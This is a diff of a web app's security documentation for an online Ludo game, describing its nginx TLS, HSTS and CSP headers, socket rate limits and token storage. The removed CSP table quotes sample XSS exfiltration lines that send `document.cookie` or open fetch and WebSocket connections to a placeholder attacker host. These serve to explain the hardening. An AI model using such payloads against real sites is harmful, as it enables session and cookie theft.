@@ -89,8 +89,8 @@ application-level authentication being reachable from the network.
   ChaCha20-Poly1305. **Session tickets are off** (`ssl_session_tickets off`), so a captured ticket key
   cannot decrypt recorded sessions, and `ssl_prefer_server_ciphers off` leaves the choice to the
   client, which on any current browser is that same ECDHE set. TLS 1.3 fixes its own ciphersuites and
-  is unaffected. See [What changed, file by file](#what-changed-file-by-file) for what the default
-  list left open.
+  is unaffected. See [The headers, file by file](#the-headers-file-by-file) for what the default
+  list leaves open.
 - nginx has **no plain-HTTP listener**. Both `server {}` blocks use `listen ... ssl`, and the only
   published nginx ports are `443` and `444`.
 - **HSTS is set per listener, and only one of them pins subdomains.** The direct listener sends
@@ -168,26 +168,21 @@ Additional edge behaviour:
   nginx buffers a body up to the limit before the API can reject it, so headroom beyond that is
   memory and disk a client can spend on requests that were always going to fail validation.
 
-### What changed, file by file
+### The headers, file by file
 
-The two files were hardened in different ways, so they are listed separately. `app.inc` carries what
-both listeners share; `nginx.conf` carries what is per listener or per connection, which is why the
-second pair of tables also covers transport and connection caps.
+`app.inc` carries what both listeners share; `nginx.conf` carries what is per listener or per connection,
+including transport and connection caps. Each table lists a directive the files set today and the attack
+it closes.
 
-#### `nginx/conf/app.inc`: removed
+#### `nginx/conf/app.inc`
 
-| Removed | Why it was insufficient | Replaced by |
-|---|---|---|
-| `script-src 'self' 'unsafe-inline'` | `'unsafe-inline'` executes any inline `<script>`, any `onclick=` attribute and any injected `<img onerror=...>`, so the policy permitted exactly the payload it exists to stop | `script-src 'self'` |
-| `default-src 'self' 'unsafe-inline'` | `default-src` is the fallback for every fetch directive that is not named, so `'unsafe-inline'` leaked into `frame-src`, `media-src`, `worker-src` and the rest | `default-src 'self'` |
-| `img-src 'self' data: https:` | `https:` with no host accepts an image from any host on the internet, so `new Image().src = 'https://attacker/?' + document.cookie` exfiltrates as an image load and never touches `connect-src` | `img-src 'self' data:` |
-| `connect-src 'self' ws: wss:` | a scheme with no host matches every host using that scheme, so `fetch('https://attacker/')` and `new WebSocket('wss://attacker/')` were both allowed | `connect-src 'self'` |
-| `X-XSS-Protection: 1; mode=block` | the legacy reflection filter was removed from Chrome and never existed in Firefox, and where it remains it can itself introduce a vulnerability by rewriting a page. It sat behind the CSP and added nothing to it | nothing: `script-src 'self'` is the control that matters |
-| `Strict-Transport-Security` set once for both listeners | a single value cannot be correct for both, because the tunnel listener's public host is an ngrok subdomain, so `includeSubDomains` there claims a domain we do not own | two per-listener headers in `nginx.conf`, below |
+Every directive the policy needs is named. A widening fallback is not used: `'unsafe-inline'` would
+execute any inline script, a bare `https:` would accept an image from any host, and a bare `ws:` or
+`wss:` would accept a socket to any host. `X-XSS-Protection` is not set either: the legacy reflection
+filter is absent from Chrome, was never in Firefox, and where it remains it can introduce a
+vulnerability by rewriting a page. The CSP is the control.
 
-#### `nginx/conf/app.inc`: added
-
-| Added | What it defends against |
+| Directive | The attack it closes |
 |---|---|
 | `Permissions-Policy: geolocation=(), camera=(), microphone=()` | a page script asking for a location, a camera or a microphone. The app uses none of the three, so the capability is removed rather than left to a prompt a user could be talked into accepting |
 | `default-src 'self'` | every fetch directive the policy does not name, which now falls back to same-origin only |
@@ -200,16 +195,9 @@ second pair of tables also covers transport and connection caps.
 | `form-action 'self'` | a form on the page posting to another origin |
 | `upgrade-insecure-requests` | a stray `http://` subresource request being fetched in the clear |
 
-#### `nginx/conf/nginx.conf`: removed
+#### `nginx/conf/nginx.conf`
 
-| Removed | Why it was insufficient | Replaced by |
-|---|---|---|
-| `client_max_body_size 10M` | five times the largest legitimate body. nginx buffers a body up to the limit before the API can refuse it, so the extra room was memory and disk spent on requests that were always going to fail validation | `client_max_body_size 3M` |
-| one HSTS value for both listeners, inherited from `app.inc` | see the last row of the `app.inc` removal table above | the two per-listener HSTS headers below |
-
-#### `nginx/conf/nginx.conf`: added
-
-| Added | What it defends against |
+| Directive | The attack it closes |
 |---|---|
 | `Strict-Transport-Security: max-age=31536000; includeSubDomains` on the direct listener | protocol downgrade and cookie theft over plain HTTP, for our own host and its subdomains |
 | `Strict-Transport-Security: max-age=31536000` on the tunnel listener | the same for the ngrok host, without claiming subdomains of a domain we do not own |
@@ -477,8 +465,9 @@ another user's link.
   tunnel origins). An empty list stops the process instead of widening to `origin: '*'`, so a missing
   value cannot silently hand every website a handshake. A token is still needed to join a game, so
   this closes the connection itself rather than the seat.
-- **What a socket may send is bounded.** Events are capped at 100 KB (`maxHttpBufferSize`, against
-  the 1 MB default), the engine pings every 10 s and drops a socket that takes more than 15 s to
+- **What a socket may send is bounded.** Events are capped at 64 KB (`maxHttpBufferSize`, the OWASP
+  figure, against the 1 MB default), one account may hold at most 4 sockets (the fifth handshake is
+  refused, which still leaves room for a stale socket during a refresh and a clash pipe), the engine pings every 10 s and drops a socket that takes more than 15 s to
   answer, and inbound events are metered per socket by a 20-event token bucket that refills over 5 s.
   A socket that drains the bucket is closed, which runs the same disconnect path as a dropped
   connection, so its seat falls into the normal reconnect grace window (45 s) rather than being held
@@ -544,8 +533,13 @@ script disguised as an image behind a benign declared type, and SQL injection th
 - **A schema change cannot destroy data unattended.** The backend entrypoint applies `prisma db push`
   without `--accept-data-loss`, so drift that would drop or narrow a column aborts the boot instead of
   being applied. A fresh database and additive changes still apply as before.
-- **The frontend stores no credential.** The session lives in the httpOnly cookies only; nothing
-  token-like is kept in `localStorage` or `sessionStorage`.
+- **The frontend stores no session credential.** The session lives in the httpOnly cookies only; nothing
+  session-like is kept in `localStorage` or `sessionStorage`. The one token that is stored is the engine
+  *match* ticket: `sessionStorage['lr.activeMatch']` (`store.tsx`) holds
+  `{ gameId, token, color, mode, playerCount }` so a page refresh can rejoin the same seat. It is signed
+  with `ENGINE_JWT_SECRET` (not the session secret), carries `aud: "ludo-engine"`, is bound to one
+  game/seat, lives 24 h, and is rejected by the backend API, so it cannot be replayed as a session.
+  CSP `script-src 'self'` (set by nginx) is the standing XSS defence for that stored value.
 - **CORS is not enabled on the backend.** Every call the SPA makes is same-origin through nginx, so
   the backend emits no cross-origin permission at all: there is no allow-list to get wrong and no
   `Access-Control-Allow-Origin` for another site's page to make use of. The engine, which browsers
